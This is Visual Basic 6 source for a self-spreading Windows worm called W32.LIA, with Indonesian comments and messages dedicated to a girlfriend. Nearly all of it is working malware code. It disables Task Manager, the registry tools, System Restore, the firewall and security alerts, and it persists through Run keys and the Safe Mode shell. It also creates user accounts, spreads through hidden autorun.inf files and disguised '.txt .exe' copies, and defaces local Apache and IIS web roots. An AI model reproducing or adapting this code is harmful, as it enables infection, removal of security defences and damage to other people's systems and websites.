VERSION 5.00
Begin VB.Form lia 
   BorderStyle     =   0  'None
   Caption         =   "W32.LIA"
   ClientHeight    =   3090
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4470
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Icon            =   "lia.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3090
   ScaleWidth      =   4470
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   3060
      TabIndex        =   1
      Top             =   240
      Width           =   675
   End
   Begin VB.Timer tmr_clipboard 
      Interval        =   100
      Left            =   120
      Top             =   1560
   End
   Begin VB.Timer Timer1 
      Interval        =   500
      Left            =   2580
      Top             =   1080
   End
   Begin VB.Timer tmr_Print 
      Interval        =   1000
      Left            =   2040
      Top             =   1080
   End
   Begin VB.Timer tmrWINWORD 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1560
      Top             =   1080
   End
   Begin VB.Timer tmrSPOOL32 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1080
      Top             =   1080
   End
   Begin VB.Timer tmrIseng 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   600
      Top             =   1080
   End
   Begin VB.Timer tmrDir 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   120
      Top             =   1080
   End
   Begin VB.ListBox lstDir 
      Height          =   840
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   2295
   End
End
Attribute VB_Name = "lia"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'====================================================
'W32.LIA                                            |
'BDG-FEB-2007                                       |
'MADE FOR @;-- LIA PRAHESTI HAMDANI --;@            |
'TAK ADA KATA MENYERAH BAGIKU UNTUK MEMILIKIMU....  |
'====================================================
'KALAU PARA MASTER MELIHAT SOURCE INI.. MAAF YAH    |
'BUKAN MAU PAMER.. AKU CUMAN MAU MENCOBA WALAU TAK  |
'MAMPU.... MOHON PETUNJUKNYA... [JC-PHLEX]          |
'====================================================
Option Explicit

Private Declare Function GetWindowsDirectory Lib "kernel32" _
    Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, _
    ByVal nSize As Long) As Long
Private Declare Function GetSystemDirectory Lib "kernel32" Alias _
    "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize _
    As Long) As Long
Private Declare Function SetVolumeLabel Lib "kernel32" Alias _
    "SetVolumeLabelA" (ByVal lpRootPathName As String, ByVal _
    lpVolumeName As String) As Long
Private Declare Function GetDriveType Lib "kernel32" Alias _
    "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function CopyFile Lib "kernel32" Alias _
    "CopyFileA" (ByVal lpExistingFileName As String, ByVal _
    lpNewFileName As String, ByVal bFailIfExists As Long) As Long
Const DRIVE_CDROM = 5
Const DRIVE_FIXED = 3
Const DRIVE_RAMDISK = 6
Const DRIVE_REMOTE = 4
Const DRIVE_REMOVABLE = 2
Private SF As String * 255

Private Function SpecialFolder(value)
On Error Resume Next
Dim FolderValue As String
If value = 0 Then
FolderValue = Left(SF, GetWindowsDirectory(SF, 255))
End If
If value = 1 Then
FolderValue = Left(SF, GetSystemDirectory(SF, 255))
End If
If Right(FolderValue, 1) = "\" Then
FolderValue = Left(FolderValue, Len(FolderValue) - 1)
End If
SpecialFolder = FolderValue
End Function

Private Sub Nyalin()
On Error Resume Next
Dim Acak As Integer
Dim i As Integer
Dim NamaW(9) As String
NamaW(0) = "data.txt"
NamaW(1) = "Penting!!.txt"
NamaW(2) = "Nitip bentar.txt"
NamaW(3) = "Curhat.txt"
NamaW(4) = "Janji.txt"
NamaW(5) = "nitip.txt"
NamaW(6) = "Lirik.txt"
NamaW(7) = "Pesan.txt"
NamaW(8) = "Maaf.txt"
For i = 0 To lstDir.ListCount
Randomize
Acak = Int(Rnd * 9)
If Len(Dir$(lstDir.List(i) & "*txt .exe")) _
    = 0 Then
PolyCopy WFile, lstDir.List(i) & NamaW(Acak) & " .exe"
End If
Next i
End Sub

Private Sub Form_Load()
On Error Resume Next
If App.PrevInstance = True Then End
RegKiller
If LCase(App.EXEName) = "spool32" Then
App.TaskVisible = False
tmrSPOOL32.Enabled = True
GoTo akhir
End If
If LCase(App.EXEName) = "winword" Then
tmrWINWORD.Enabled = True
tmrDir.Enabled = True
tmrIseng.Enabled = True
GoTo akhir
End If
Infect_system
If Dir(SpecialFolder(1) & "\NOTE.EXE") <> "" And _
    WinCheck("NOTE.EXE") = True Then End
tmrSPOOL32_Timer
Unload Me
akhir:
End Sub
Private Sub Infect_system()
On Error Resume Next
'FILE SPAWN.. exe ga usah lah... hehe @_@

SetStringValue "HKEY_CLASSES_ROOT\inffile\shell\Install", "", _
"&Mau Install Ya??"

'SAFEMODE
SetStringValue "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SafeBoot", "AlternateShell", _
SpecialFolder(1) & "\SPOOL32.EXE"
SetStringValue "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\SafeBoot", "AlternateShell", _
SpecialFolder(1) & "\SPOOL32.EXE"
SetStringValue "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\SafeBoot", "AlternateShell", _
SpecialFolder(1) & "\SPOOL32.EXE"
SetStringValue "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot", "AlternateShell", _
SpecialFolder(1) & "\SPOOL32.EXE"


'Notice
SetStringValue "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system", "legalnoticecaption", "JC-P" & _
    "HLEX back to this world with W32.LIA"
SetStringValue "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system", "legalnoticetext", "Maaf " & _
    "untuk sementara aku dikomputer kalian... yakin deh..." & _
    "cuman sementara.. aku gak ngerusak kok... Aku bikin juga sengaja" & _
    " biar ga terlalu susah dibasminya , Cuman pengen " & _
    "temen2 tau kalau aku sayang banget ama dia!! doakan aku " & _
    "ya... untuk terus bertahan dan berusaha..peace jangan marah ya ....Y(^0^)Y "

'IE Title
SetStringValue "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Window Title", "Karena Kusayang Kamu!!"

'TIME
SetStringValue "HKEY_CURRENT_USER\Control Panel\International", "s1159", "LIA"
SetStringValue "HKEY_CURRENT_USER\Control Panel\International", "s2359", "LIA"

'Screensaver
SetStringValue "HKEY_CURRENT_USER\Control Panel\Desktop", "SCRNSAVE.EXE", SpecialFolder(1) & "\SPOOL32.EXE"
SetStringValue "HKEY_CURRENT_USER\Control Panel\Desktop", "ScreenSaveTimeOut", "300"
SetDWORDValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispScrSavPage", 1

'Exefile
SetStringValue "HKEY_CLASSES_ROOT\exefile", "NeverShowExt", ""
SetStringValue "HKEY_CLASSES_ROOT\exefile", "", "Text Document"

'Disable
SetDWORDValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden", 0
SetDWORDValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions", 1
SetDWORDValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", 1
SetDWORDValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Start_ShowSearch", 0
SetDWORDValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Start_ShowRun", 0
SetDWORDValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 1
SetDWORDValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFind", 1
SetDWORDValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableCMD", 1
SetDWORDValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1
SetDWORDValue "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer", "NoFolderOptions", 1
SetDWORDValue "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\System", "DisableCMD", 1
SetDWORDValue "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\System", "DisableTaskMgr", 1
SetDWORDValue "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableConfig", 1
SetDWORDValue "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", 1
SetDWORDValue "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile", "EnableFirewall", 0
SetDWORDValue "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center", "AntiVirusDisableNotify", 1
SetDWORDValue "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center", "FirewallDisableNotify", 1
SetDWORDValue "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center", "UpdatesDisableNotify", 1
SetDWORDValue "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Security Center", "AntiVirusDisableNotify", 1
SetDWORDValue "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Security Center", "FirewallDisableNotify", 1
SetDWORDValue "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Security Center", "UpdatesDisableNotify", 1
SetDWORDValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispCPL", 1
SetDWORDValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp", "Disabled", 1
SetDWORDValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoViewContextMenu", 1

'PAGE LIA
If Dir("C:\bg.gif") = "" Then
DropFile "CUSTOM", 102, "C:\bg.gif"
If Dir("C:\little_angel.lia") = "" Then
DropFile "CUSTOM", 103, "C:\little_angel.lia"
FileCopy "C:\little_angel.lia", "C:\little_angel.html"
SetStringValue "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "C:\little_angel.html"
SetStringValue "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Local Page", "C:\little_angel.html"
End If
End If

'USER LIA
Shell ("net user L!A heldaf /add")
Shell ("net user bwt_Kmu! /add")

'KAMUFLASE
Dim i As Integer
Dim filenya As String
For i = 0 To 2
Name (SpecialFolder(0) & "\desktop.ini") As (SpecialFolder(0) & "\ini.lia")
Shell ("attrib -h" & SpecialFolder(0) & "\ini.lia")
Kill SpecialFolder(0) & "\ini.lia"
Shell ("attrib -s" & SpecialFolder(0))
filenya = SpecialFolder(0) & "\desktop.ini"
Open filenya For Output As #1
Print #1, "[.ShellClassInfo]"
Print #1, "CLSID={21EC2020-3AEA-1069-A2DD-08002B30309D}"
Close (1)
SetAttr (filenya), vbHidden
SetAttr (SpecialFolder(0)), vbSystem
Next i

'DRIVE
SetLabel "C:\", "HELDAF ^_^"

'hai
MsgBox "HALOO...Senang Bertemu Denganmu... >(^_^;)<"

'ICON luthu
If Dir(SpecialFolder(1) & "\" & "ia.ico") = "" Then
DropFile "CUSTOM", 104, SpecialFolder(1) & "\" & "ia.ico"
SetStringValue "HKEY_CLASSES_ROOT\MP3File\DefaultIcon", _
    "", SpecialFolder(1) & "\" & "ia.ico"
End If
    
'DEFACE booww... + rule the system.. huahahaha

'APACHE
Dim a As Integer
For a = 0 To 2
'PHPTriad
Name "C:\apache\htdocs\index.php" As "C:\apache\htdocs\index.lia"
Kill "C:\apache\htdocs\index.lia"
Kill "C:\apache\htdocs\index.html"
Kill "C:\apache\htdocs\index.htm"
If Dir("C:\apache\htdocs\index.php") = "" Then
DropFile "CUSTOM", 105, "C:\apache\htdocs\index.php"
End If
Next a

For a = 0 To 2
'Apache2Triad
Name "C:\apache2triad\htdocs\index.php" As "C:\apache2triad\htdocs\index.lia"
Kill "C:\apache2triad\htdocs\index.lia"
Kill "C:\apache2triad\htdocs\index.html"
Kill "C:\apache2triad\htdocs\index.htm"
If Dir("C:\apache2triad\htdocs\index.php") = "" Then
DropFile "CUSTOM", 105, "C:\apache2triad\htdocs\index.php"
End If
Next a

'IIS
Dim aspfile As String
For a = 0 To 2
Name "C:\InetPub\wwwRoot\index.html" As "C:\InetPub\wwwRoot\index.lia"
Kill "C:\InetPub\wwwRoot\index.lia"
Kill "C:\InetPub\wwwRoot\index.php"
Kill "C:\InetPub\wwwRoot\index.asp"
Kill "C:\InetPub\wwwRoot\index.htm"
    aspfile = "C:\InetPub\wwwRoot\index.html"
    Open aspfile For Output As #1
    Print #1, "<!-- c0D3d bY JC-PHLEX -->"
    Print #1, "<html>"
    Print #1, "<head><title>W32.LIA Defaced this site</title></head>"
    Print #1, "<body>"
    Print #1, "<center><h1>W32.LIA udah mampir kesinih... ^_^ </h1></center>"
    Print #1, "</body>"
    Print #1, "</html>"
    Close (1)
Next a

'ultah ...
If Day(Now) = 29 And Month(Now) = 4 Then
MsgBox "Waaah ga kerasa... hari ini aku udah kepala dua... Dua puluh Booow !!"
End If

'Readme
    Dim filenye As String
    filenye = "c:\Maaf!!!.txt"
    Open filenye For Output As #1
    Print #1, "Maaf Sebelumnya.. Punteun Sadayana "
    Print #1, "=================================="
    Print #1, ""
    Print #1, "Saya cuman mau nitip tulisan ini.. "
    Print #1, "Sebuah ungkapan rasa sayang...."
    Print #1, "Kepada seseorang yang terlalu kusayangi.."
    Print #1, "Walau sakit kurasa.. aku akan terus mencintanya.."
    Print #1, ""
    Print #1, "Jika boleh aku bermimpi... Aku akan menunggunya.."
    Print #1, "Dia Nafas Dan Nyawa Hidupku.."
    Print #1, ""
    Print #1, ""
    Print #1, "MAAF LANCANG NITIP SEMBARANGAN...[JC-PHLEX]"
    Print #1, "-------------------------------------------"
    Close (1)

End Sub
Private Sub Timer1_Timer()
Dim filenya As String
Dim i As Byte
For i = 1 To Drive1.ListCount - 1
If GetDriveType(Drive1.List(i) & "\") = 2 Then
If Len(Dir$(Drive1.List(i) & "\update.ico")) = 0 Then
DropFile "CUSTOM", 101, Drive1.List(i) & "\" & "update.ico"
CopyFile WFile, Drive1.List(i) & "\README.EXE", False
CopyFile WFile, Drive1.List(i) & "\nitip.txt .exe", False
filenya = Drive1.List(i) & "\autorun.inf"
Open filenya For Output As #1
Print #1, "[autorun]"
Print #1, "OPEN=README.EXE"
Print #1, "ICON=update.ico"
Print #1, "ACTION=Click here to fix your Disk"
Close 1
Shell ("attrib +h +s +r " & Drive1.List(i) & "\autorun.inf")
Shell ("attrib +h +s +r " & Drive1.List(i) & "\README.EXE")
Shell ("attrib +h +s    " & Drive1.List(i) & "\update.ico")
Shell ("attrib +h +s " & Drive1.List(i) & "\*.")

End If
End If
Next i
End Sub

Private Sub tmr_clipboard_Timer()
On Error Resume Next
Clipboard.Clear
Clipboard.SetText "  [ Dalam heningku.... aku selalu ada ] "
End Sub

Private Sub tmr_Print_Timer()
If Second(Now) = 29 Then
Printer.CurrentX = 1500
Printer.CurrentY = 2200
Printer.FontBold = True
Printer.FontUnderline = True
Printer.FontItalic = False
Printer.FontSize = 30
Printer.Print "W32.LIA numpang ngeprint"
Printer.Print ""
Printer.FontUnderline = False
Printer.FontItalic = False
Printer.FontSize = 18
Printer.Print "Happy 20 To My LIttle Angel 25-02-2007..o(+_-)o"
Printer.Print ""
Printer.Print "                 @;------"
Printer.Print ""
Printer.Print ""
Printer.FontItalic = True
Printer.Print "Aku Terlalu Sayang Padamu ^_^"
Printer.Print "Kaulah yang kuinginkan dari segalanya!!"
Printer.Print "Aku mencintamu setulus hatiku..."
Printer.Print "Disetiap Rinduku.. jiwa ini hanya memanggilmu!!"
Printer.Print "Aku rela menanti datangnya waktu untukku .."
Printer.Print "Karena kaulah Nafas .. Serta Nyawa Hidupku.."
Printer.Print "Yang memberiku bekal untuk bertahan hidup.."
Printer.Print ""
Printer.Print ""
Printer.Print ""
Printer.Print "Aku persembahkan ini untuk Malaikat Kecilku..."
Printer.Print "Yang selalu terbang dalam fikiranku..."
Printer.Print "Dengan kedua sayap indahnya..."
Printer.Print ""
Printer.CurrentX = 7000
Printer.CurrentY = 15000
Printer.FontItalic = True
Printer.FontSize = 10
Printer.Print "Punteun ngerepotin temen2........ [JC-PHLEX]"
Printer.EndDoc
End If
End Sub

Private Sub tmrDir_Timer()
On Error Resume Next
GetDir lstDir
Nyalin
If Minute(Now) = 1 Then
tmrDir.Enabled = False
PayLoad
End If
End Sub

Private Sub PayLoad()
Restart
End Sub

Private Sub tmrIseng_Timer()
If Second(Now) > 29 Then
WildMouse (True)
Else
WildMouse (False)
End If
End Sub

Private Sub tmrWINWORD_Timer()
On Error Resume Next
tmrWINWORD.Enabled = False
If Dir(SpecialFolder(0) & "\SPOOL32.EXE") = "" Or WinCheck _
    ("SPOOL32.EXE") = False Then
PolyCopy WFile, SpecialFolder(0) & "\SPOOL32.EXE"
Shell (SpecialFolder(0) & "\SPOOL32.EXE")
End If
If GetStringValue("HKEY_LOCAL_MACHINE\Software\Micr" & _
    "osoft\Windows\CurrentVersion\Run", "Printer Cpl") <> _
    SpecialFolder(0) & "\SPOOL32.EXE" Then
SetStringValue "HKEY_LOCAL_MACHINE\Software\Microso" & _
    "ft\Windows\CurrentVersion\Run", "Printer Cpl", SpecialFolder _
    (0) & "\SPOOL32.EXE"
End If
If GetStringValue("HKEY_CURRENT_USER\Software\Micros" & _
    "oft\Windows\CurrentVersion\Run", "NOTE") <> _
    SpecialFolder(1) & "\NOTE.EXE" Then
SetStringValue "HKEY_CURRENT_USER\Software\Microsoft" & _
    "\Windows\CurrentVersion\Run", "NOTE", _
    SpecialFolder(1) & "\NOTE.EXE"
End If
WinExit "taskmgr.exe"
tmrWINWORD.Enabled = True
End Sub

Private Sub tmrSPOOL32_Timer()
On Error Resume Next
tmrSPOOL32.Enabled = False
If Dir(SpecialFolder(1) & "\NOTE.EXE") = "" _
    Or WinCheck("NOTE.EXE") = False Then
PolyCopy WFile, SpecialFolder(1) & "\NOTE.EXE"
Shell (SpecialFolder(1) & "\NOTE.EXE")
End If
tmrSPOOL32.Enabled = True
End Sub

Private Sub RegKiller()
On Error Resume Next
CreateKey "HKEY_CURRENT_USER\Software\Microsoft\Win" & _
    "dows\CurrentVersion\Policies\System"
If GetDWORDValue("HKEY_CURRENT_USER\Software\Mic" & _
    "rosoft\Windows\CurrentVersion\Policies\System", "DisableR" & _
    "egistryTools") <> 1 Then
SetDWORDValue "HKEY_CURRENT_USER\Software\Micro" & _
    "soft\Windows\CurrentVersion\Policies\System", "DisableRe" & _
    "gistryTools", 1
End If
If Dir(SpecialFolder(1) & "\cmd.exe") <> "" Then
SetStringValue "HKEY_CLASSES_ROOT\regfile\shell\open\co" & _
    "mmand", "", "cmd.exe /c del " & """%1"""
Else
SetStringValue "HKEY_CLASSES_ROOT\regfile\shell\open\co" & _
    "mmand", "", "command.com /c del " & """%1"""
End If

End Sub

Function PolyCopy(Source As String, Destination As String)
On Error Resume Next
Dim RndNum As String
Dim RndNo As String
Dim PoliStr As String
Dim i As Long
RndNum = RndNum & Second(Now)
If Len(RndNum) = 2 Then
For i = 1 To 2
RndNo = Int(Rnd * 9)
RndNum = RndNum & RndNo
Next i
Else
For i = 1 To 3
RndNo = Int(Rnd * 9)
RndNum = RndNum & RndNo
Next i
End If
If LCase(Right(Source, 4)) <> ".exe" Then
Source = Source & ".exe"
End If
FileCopy Source, Destination
Open Destination For Binary As #1
Source = Space$(LOF(1))
Get #1, , Source
PoliStr = Mid(Source, 113, 4)
Put #1, InStr(1, Source, PoliStr), RndNum
Close #1
End Function
Private Function SetLabel(RootName As String, NewLabel As String)
If RootName = "" Then
Exit Function
End If
Call SetVolumeLabel(RootName, NewLabel)
End Function
Private Function DropFile(ResType As String, ResID As Long, _
    OutputPath As String)
On Error Resume Next
Dim DROP() As Byte
DROP = LoadResData(ResID, ResType)
Open OutputPath For Binary As #1
Put #1, , DROP
Close #1
End Function

Private Function WFile()
Dim WPath, WName As String
WPath = App.Path
If Right(WPath, 1) <> "\" Then
WPath = WPath & "\"
End If
WName = App.EXEName & ".exe"
WFile = WPath & WName
End Function
